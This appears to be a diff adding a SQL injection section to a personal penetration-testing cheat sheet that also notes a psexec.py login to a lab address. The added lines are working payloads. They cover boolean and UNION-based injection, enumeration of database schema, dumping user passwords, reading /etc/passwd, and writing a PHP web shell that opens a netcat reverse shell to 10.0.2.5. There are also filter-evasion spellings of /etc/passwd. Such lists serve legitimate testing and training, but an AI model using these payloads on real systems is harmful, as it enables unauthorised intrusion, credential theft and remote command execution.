@@ -386,3 +386,26 @@ C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console
 
 connect to windows with authentication credentials
 psexec.py administrator@10.129.133.179 
+
+*** SQL INJECTION ***
+/etc/pa**wd
+/etc/pa?swd
+/etc/pa''sswd
+lsof -i :80
+
+1' AND 1=1# (# 0R -- OR //)
+1' AND 1=1;#
+1' OR 1=1#
+1'+OR+1=1#
+1' UNION SELECT 1,2,3,4#
+1' UnIoN sElEcT 1,2,3,4#
+1'%20UnIoN%20sElEcT%201,2,3,4%23
+1' UNION SELECT 1,database(),user(),version()#
+1' UNION SELECT 1,2,table_name,4 FROM information_schema.tables#
+1' UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_name='owsp'#
+1' UNION SELECT 1,2,table_name,4 FROM information_schema.tables WHERE table_name=0x64767761#
+1' UNION SELECT 1,2,column_name,4 FROM information_schema.columns WHERE column_name='users'#
+1' UNION SELECT fname,password FROM users #
+1' UNION SELECT 1,load_file('/etc/passwd')#
+1' UNION SELECT 1,'payload here' into outfile 'save to location'#
+1' UNION SELECT 1,'<?passthru("nc 10.0.2.5 1234 -e /bin/sh");?>' into outfile '/tmp/shell.php'#
